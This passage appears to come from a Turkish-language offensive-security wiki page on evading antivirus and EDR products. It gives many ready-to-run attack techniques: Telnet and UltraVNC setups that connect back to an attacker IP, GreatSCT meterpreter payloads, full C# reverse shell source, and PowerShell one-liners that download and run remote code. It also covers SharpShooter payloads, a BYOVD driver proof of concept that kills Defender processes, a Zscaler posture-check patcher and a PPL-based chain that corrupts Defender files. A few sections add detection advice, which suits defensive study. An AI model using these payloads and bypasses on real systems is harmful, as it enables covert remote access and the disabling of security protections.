Bu aynı zamanda [@mariuszbit](https://twitter.com/mariuszbit) tarafından verilen Evasion in Depth hakkında başka harika bir konuşmadır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) kullanarak, Defender'ın hangi parçayı kötü amaçlı bulduğunu bulana kadar ikilinin parçalarını **kaldırabilir** ve bunu size böler.\
Aynı işi yapan bir diğer araç ise [**avred**](https://github.com/dobin/avred) olup hizmeti açık web üzerinden [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde sunmaktadır.

### **Telnet Server**

Windows 10'a kadar tüm Windows sürümleri, (yönetici olarak) şu şekilde kurabileceğiniz bir **Telnet server** ile geliyordu:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında **başlamasını** sağlayın ve şimdi **çalıştırın**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portunu değiştir** (stealth) ve firewall'u devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

İndirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin indirmelerini tercih edin, setup değil)

**HOST ÜZERİNDE**: _**winvnc.exe**_ çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanına bir parola belirleyin
- _View-Only Password_ alanına bir parola belirleyin

Sonra, ikili dosya _**winvnc.exe**_ ile **yeni oluşturulan** _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

The **attacker** kendi **host**'unda `vncviewer.exe -listen 5900` ikilisini çalıştırmalı; böylece bir reverse **VNC connection** yakalamaya **hazır** olur. Ardından, **victim** içinde: winvnc daemon'unu `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Stealth'i korumak için bazı şeyleri yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın aksi takdirde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın; aksi halde [konfigürasyon penceresi](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` çalıştırmayın, aksi halde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

İndirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT'in İçinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi **lister'ı başlatın** `msfconsole -r file.rc` ile ve **xml payload**'ı şu komutla **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut Defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derlemek

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şunu derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Bununla kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# ile derleyici kullanma
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve yürütme:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Enjektör oluşturma için python kullanım örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Çekirdek Alanından AV/EDR'yi Sonlandırma

Storm-2603, fidye yazılımı bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** adlı küçük bir konsol aracını kullandı. Araç, **kendi savunmasız ancak *imzalı* sürücüsünü** getirir ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemeyeceği ayrıcalıklı çekirdek işlemlerini gerçekleştirmek için bunu kötüye kullanır.

Önemli çıkarımlar
1. **İmzalı sürücü**: Diske bırakılan dosya `ServiceMouse.sys` olarak adlandırılıyor, ancak ikili dosya Antiy Labs’in “System In-Depth Analysis Toolkit”ten meşru şekilde imzalanmış `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olduğunda bile yüklenir.
2. **Servis kurulumu**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır sürücüyü bir **kernel servisi** olarak kaydeder, ikinci satır ise başlatarak `\\.\ServiceMouse`'ın user land'den erişilebilir hale gelmesini sağlar.
3. **Sürücünün açığa çıkardığı IOCTL'ler**
| IOCTL code | İşlev                              |
|-----------:|------------------------------------|
| `0x99000050` | Belirli bir PID ile rastgele bir süreci sonlandırma (Defender/EDR servislerini sonlandırmak için kullanıldı) |
| `0x990000D0` | Diskteki rastgele bir dosyayı silme |
| `0x990001D0` | Sürücüyü unload etme ve servisi kaldırma |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Neden işe yarıyor**: BYOVD, user-mode korumalarını tamamen atlar; çekirdekte çalışan kod, korumalı süreçleri açabilir, bunları sonlandırabilir veya PPL/PP, ELAM veya diğer sertleştirme özelliklerine bakılmaksızın çekirdek nesneleriyle oynayabilir.

Tespit / Azaltma
•  Microsoft’un savunmasız-sürücü engelleme listesini (`HVCI`, `Smart App Control`) etkinleştirin, böylece Windows `AToolsKrnl64.sys` yüklemeyi reddeder.  
•  Yeni *kernel* servis oluşturulmalarını izleyin ve bir sürücü world-writable bir dizinden yüklendiğinde veya izin listesinde değilse alarm verin.  
•  Özel device objelerine yönelik user-mode handle oluşumlarını ve ardından şüpheli `DeviceIoControl` çağrılarını gözlemleyin.

### Zscaler Client Connector Posture Kontrollerini Disk Üzerindeki Binary Yamalarıyla Atlatma

Zscaler’ın **Client Connector**'ı cihaz-durumu kurallarını yerel olarak uygular ve sonuçları diğer bileşenlerle iletmek için Windows RPC'ye güvenir. İki zayıf tasarım tercihi tam bir atlamayı mümkündür kılar:

1. Posture değerlendirmesi **tamamen client-side** gerçekleşir (sunucuya boolean bir değer gönderilir).  
2. Dahili RPC endpoint’leri, bağlanan yürütülebilir dosyanın **Zscaler tarafından imzalı** olduğunu (WinVerifyTrust aracılığıyla) doğrulamakla sınırlıdır.

Diskteki dört imzalı ikiliyi yama yaparak her iki mekanizma da nötralize edilebilir:

| Binary | Değiştirilen orijinal mantık | Sonuç |
|--------|------------------------------|-------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür; böylece her kontrol uyumlu kabul edilir |
| `ZSAService.exe` | WinVerifyTrust'e dolaylı çağrı | NOP ile etkisizleştirildi ⇒ herhangi bir (imzasız bile) süreç RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirildi |
| `ZSATunnel.exe` | Tünel üzerindeki bütünlük kontrolleri | Kısa devre yapıldı |

Minimal patcher kesiti:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyalar değiştirildikten ve servis yığını yeniden başlatıldıktan sonra:

* **Tüm** posture kontrolleri **yeşil/uyumlu** olarak görünür.
* İmzalanmamış veya değiştirilmiş ikililer named-pipe RPC uç noktalarını açabilir (örn. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Sömürülmüş host, Zscaler politikalarıyla tanımlanan iç ağa sınırsız erişim kazanır.

Bu vaka çalışması, tamamen istemci tarafı güven kararlarının ve basit imza kontrollerinin birkaç byte yamasıyla nasıl alt edilebileceğini gösterir.

## Protected Process Light (PPL) Kullanarak LOLBIN'lerle AV/EDR'e Müdahale

Protected Process Light (PPL), yalnızca eşit veya daha yüksek korumalı süreçlerin birbirlerine müdahale edebilmesi için bir imzalayıcı/seviye hiyerarşisi uygular. Offansif olarak, eğer meşru şekilde PPL-etkin bir ikiliyi başlatıp argümanlarını kontrol edebiliyorsanız, zararsız işlevselliği (örn. logging) AV/EDR tarafından kullanılan korumalı dizinlere karşı kısıtlı, PPL destekli bir yazma ilkeline dönüştürebilirsiniz.

Bir sürecin PPL olarak çalışması için gerekenler
- Hedef EXE (ve yüklenen DLL'ler) PPL-uyumlu bir EKU ile imzalanmış olmalıdır.
- Süreç, CreateProcess ile şu bayraklar kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- İkiliyi imzalayanla eşleşen uyumlu bir koruma seviyesi talep edilmelidir (örn. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Yanlış seviyeler oluşturma sırasında başarısız olur.

Ayrıca PP/PPL ve LSASS korumasına daha kapsamlı bir giriş için şu kaynağa bakın:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Başlatıcı araçları
- Açık kaynaklı yardımcı: CreateProcessAsPPL (koruma seviyesini seçer ve argümanları hedef EXE'ye iletir):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Kullanım deseni:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` kendini başlatır ve çağıranın belirttiği bir yola günlük dosyası yazmak için bir parametre kabul eder.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp boşluk içeren yolları çözemiyor; normalde korunan konumlara işaret etmek için 8.3 kısa yolları kullanın.

8.3 short path helpers
- Kısa adları listelemek için: her üst dizinde `dir /x`.
- cmd'de kısa yolu türetin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN (ClipUp) ile `CREATE_PROTECTED_PROCESS` kullanarak bir başlatıcı (ör. CreateProcessAsPPL) aracılığıyla çalıştırın.
2) ClipUp log-yolu argümanını vererek korunan bir AV dizininde (ör. Defender Platform) dosya oluşturulmasını zorlayın. Gerekirse 8.3 kısa adları kullanın.
3) Hedef ikili dosya AV tarafından çalışırken genelde açık/kilitli ise (ör. MsMpEng.exe), yazmayı AV başlamadan önce önyüklemede planlayın — bunun için daha erken güvenilir şekilde çalışan bir otomatik başlatma servisi kurun. Önyükleme sıralamasını Process Monitor ile doğrulayın (boot logging).
4) Yeniden başlatmada PPL-backed yazma, AV ikililerini kilitlemeden önce gerçekleşir; hedef dosyayı bozarak başlatılmasını engeller.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve kısıtlar
- ClipUp'un yazdığı içeriği yerleştirme dışında kontrol edemezsiniz; bu primitif hassas içerik enjeksiyonundan çok bozmaya (corruption) uygundur.
- Bir servisi kurmak/başlatmak ve yeniden başlatma penceresi için local admin/SYSTEM gerektirir.
- Zamanlama kritik: hedef açık olmamalı; önyükleme zamanı çalıştırma dosya kilitlerinden kaçınır.

Tespitler
- Özellikle önyükleme sırasında, olağandışı argümanlarla ve standart olmayan başlatıcılar tarafından ebeveynlenmiş olarak `ClipUp.exe` süreç oluşturma.
- Yeni servislerin şüpheli binaries'leri otomatik başlatacak şekilde yapılandırılması ve Defender/AV'den önce tutarlı şekilde başlaması. Defender başlangıç hatalarından önceki servis oluşturma/değişikliklerini araştırın.
- Defender binaries/Platform dizinlerinde dosya bütünlüğü izleme; protected-process flag'ine sahip süreçler tarafından beklenmeyen dosya oluşturma/değişiklikleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulmuş süreçlere ve non-AV binaries tarafından anormal PPL seviye kullanımına bakın.

Önlemler
- WDAC/Code Integrity: hangi imzalı binaries'in PPL olarak ve hangi ebeveynler altında çalışabileceğini kısıtlayın; meşru bağlamların dışındaki ClipUp çağrılarını engelleyin.
- Service hygiene: otomatik başlatmalı servislerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender tamper protection ve early-launch korumalarının etkin olduğundan emin olun; binary corruption gösteren başlangıç hatalarını araştırın.
- Güvenlik araçlarını barındıran hacimlerde ortamınızla uyumluysa 8.3 kısa ad üretimini devre dışı bırakmayı düşünün (iyice test edin).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
